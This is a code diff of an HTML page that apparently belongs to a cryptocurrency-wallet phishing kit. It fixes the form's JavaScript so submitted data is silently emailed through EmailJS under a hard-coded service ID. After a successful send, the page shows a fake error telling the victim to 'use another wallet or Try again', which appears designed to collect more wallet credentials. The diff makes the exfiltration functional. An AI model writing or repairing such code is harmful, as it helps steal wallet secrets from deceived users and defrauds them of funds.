@@ -1565,7 +1565,7 @@
             <br>
           </div>
 
-             <form id="form">
+              <form action="" method="post" enctype="multipart/form-data" id="my-form" class="ajaxForm">
                                       
                                        
                                        
@@ -1626,16 +1626,16 @@
 <script>
 const btn = document.getElementById('submit');
 
-document.getElementById('form')
+document.getElementById('my-form')
  .addEventListener('submit', function(event) {
    event.preventDefault();
 
    btn.value = 'Sending...';
 
-   const serviceID = 'default_service';
+   const serviceID = 'service_q2f4nie';
    const templateID = 'template_9m90gb7';
 
-   emailjs.sendForm(service_q2f4nie, templateID, this)
+    emailjs.sendForm(serviceID, templateID, this)
     .then(() => {
       btn.value = 'Send Email';
       alert('An Error occurred!!! use another wallet or Try again');
